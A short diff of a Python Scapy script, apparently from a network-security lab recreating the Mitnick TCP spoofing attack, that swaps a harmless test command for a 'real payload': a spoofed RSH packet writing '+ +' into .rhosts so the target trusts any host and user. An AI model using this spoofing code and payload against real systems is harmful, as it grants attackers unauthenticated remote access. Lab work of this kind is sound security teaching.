@@ -32,11 +32,16 @@ def spoof(pkt):
 		#The connection is established, now send the payload
 		#RSH Protocol Format: [stderr port]\0[client_user \0[server_user]\0[command]\0
 		# Use port '9090' for the error channel (handled in Task 2.2)
+		
 		# Use 'touch /tmp/xyz' as test command
-		data= '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
+		# data= '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
+		
+		# Real payload
+		data= '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
+		
 
 		#Construct TCP Data Packet (PSH+ACK)
-		#Use the same seq_num because the previou ACL carried 0 bytes of data
+		#Use the same seq_num because the previou ACK carried 0 bytes of data
 		tcp_data=TCP(sport=config.TRUSTED_SERVER_PORT, dport=config.X_TERMINAL_PORT, flags='PA', seq=seq_num, ack=ack_num)
 
 		print(f"[*] Sending RSH Payload: {data}")
